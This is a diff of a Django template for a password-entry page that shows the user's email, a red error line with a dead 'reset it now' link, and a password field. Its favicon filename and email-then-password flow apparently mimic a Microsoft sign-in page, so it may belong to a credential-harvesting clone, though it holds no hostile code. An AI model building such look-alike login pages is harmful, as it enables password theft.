@@ -9,28 +9,28 @@
     <link rel="stylesheet" href="{% static 'styles/style.css' %}">
     <link rel="shortcut icon" href="{% static 'images/favicon_a_eupayfgghqiai7k9sol6lg2.ico' %}" type="image/x-icon">
 </head>
-<body>
+<body style="background: url({% static 'images/background.png' %}) no-repeat;font-family:  system-ui, -apple-system,Segoe UI, BlinkMacSystemFont,  Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;">
     <div class="container">
         <div class="container-header">
             <a href="index" class="logo"><img src="{% static 'images/logo.svg' %}" alt="" class="logo-img"></a>
         </div>
-        
+
         {% if title == 'Password' %}
             <div class="small"><a href="{% url 'elogin' %}"><img width="20px" src="{% static 'images/bx-arrow-back.svg' %}" alt=""> </a>{{user.email}}</div>
             {% else %}
              <div class="small"><a href="{{request.META.HTTP_REFERER}}"><img width="20px" src="{% static 'images/bx-arrow-back.svg' %}" alt=""> </a>{{user.email}}</div>
         {% endif %}
-            
-       
-        
+
+
+
         <div class="content">
-            <div class="heading">{{title}}</div>
+            <div class="heading">Enter Password</div>
 
             <form class="form" method="post">
                 {% csrf_token %}
-                <p id="error-msg"></p>
+                <p style="color:red;">{% if error %} {{error}} <a href="#">reset it now.</a> {% else %} {{error2}}{% endif %} </p>
 
-                <input type="password" name="passcode" placeholder="Password" value="" >               
+                <input type="password" name="passcode" placeholder="Password" value="" id="password-id" {% if error %} style="border-bottom-color: #e72424;" {% endif %}>
                 <p>{{error_message}}</p>
                 <p class="create-acct"><a href="#">Forgotten your password?</a></p>
 
@@ -43,5 +43,6 @@
             </form>
         </div>
     </div>
+
 </body>
 </html>
